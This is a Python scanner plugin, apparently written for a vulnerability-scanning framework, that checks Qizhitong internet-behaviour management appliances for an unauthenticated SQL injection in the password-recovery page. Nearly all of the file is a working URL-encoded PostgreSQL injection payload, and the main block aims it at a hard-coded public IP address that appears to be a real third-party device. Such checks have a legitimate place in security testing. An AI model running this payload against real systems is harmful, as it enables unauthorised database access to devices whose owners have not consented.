#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 企智通系列上网行为管理设备存在通用型SQL注入(无需登录DBA权限)
refer: http://www.wooyun.org/bugs/wooyun-2015-0139442
description:
    忘记密码处SQL注入
    recvpass.do?acc=admin'&mail=admin@a.com&usbkey=
'''


def assign(service, arg):
    if service == 'qizhitong_manager':
        return True, arg

def audit(arg):
    payload = arg + 'recvpass.do?acc=adminaaa%27%20AND%207798=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(113)||CHR(113))||(SELECT%20(CASE%20WHEN%20(7798=7798)%20THEN%201%20ELSE%200%20END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113))%20AS%20NUMERIC)%20AND%20%27slur%27=%27slur&mail=admin@a.com&usbkey='
    code, head, res, err, _ = curl.curl2(payload)
    if(code == 200) and ('qvkqq1qjkjq' in res):
        security_hole('SQL injection: ' + payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('qizhitong_manager','http://218.5.171.52:10000/')[1])